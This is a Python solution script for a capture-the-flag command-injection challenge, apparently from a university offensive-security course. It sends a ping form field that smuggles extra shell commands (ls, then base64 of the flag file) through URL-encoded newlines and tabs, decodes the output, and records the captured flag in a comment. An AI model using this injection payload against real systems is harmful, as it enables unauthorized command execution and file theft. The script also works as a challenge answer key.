import base64
import requests

url = 'http://offsec-chalbroker.osiris.cyber.nyu.edu:1503'
netid = 'xz4344'
cookies = {"CHALBROKER_USER_ID": netid}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
}
data = 'ip=8.8.8.8%0als%0abase64%09f14g_cmdi.php'

print(f'[*] Ping with data: {data}')
r = requests.post(url=f'{url}/ping.php', headers=headers, data=data, cookies=cookies)
print(f'[+] Raw Response:\n{r.text}')

base64_encoded_data = ''.join(r.text.split('\n')[-3:-1])
print(f'[+] Extracting base64 encoded data: {base64_encoded_data}')
base64_decoded_data = base64.b64decode(base64_encoded_data).decode('utf-8')
print(f'[+] Decoding base64 encoded data: {base64_decoded_data}')

# flag{now_you_have_command_to_my_army_snow!_5dda91ac79d950df}
